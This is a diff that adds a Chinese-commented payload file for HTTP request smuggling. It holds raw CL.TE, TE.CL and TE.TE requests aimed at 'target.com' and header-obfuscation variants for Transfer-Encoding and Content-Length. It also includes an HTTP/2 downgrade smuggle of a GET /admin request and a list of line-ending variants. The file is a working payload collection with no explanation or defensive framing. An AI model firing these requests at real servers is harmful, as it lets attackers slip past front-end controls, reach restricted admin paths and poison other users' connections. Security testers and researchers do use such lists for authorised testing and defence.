@@ -1,0 +1,69 @@
+# HTTP 请求走私
+# CL.TE (前端用 Content-Length, 后端用 Transfer-Encoding)
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# TE.CL (前端用 Transfer-Encoding, 后端用 Content-Length)
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+# TE.TE (混淆 Transfer-Encoding)
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+0
+
+SMUGGLED
+
+# Transfer-Encoding 变体
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+
+# Content-Length 变体
+Content-Length: 0
+Content-Length : 0
+Content-Length: 0
+Content-Length: 0
+Content-Length: 0x0
+Content-Length: 00
+
+# HTTP/2 降级走私
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+# 换行符变体
+\r\n (CRLF)
+\n (LF)
+\r (CR)
+\x0b (VT)
+\x0c (FF)
+\x85 (NEL)
+\u2028 (LS)
+\u2029 (PS)
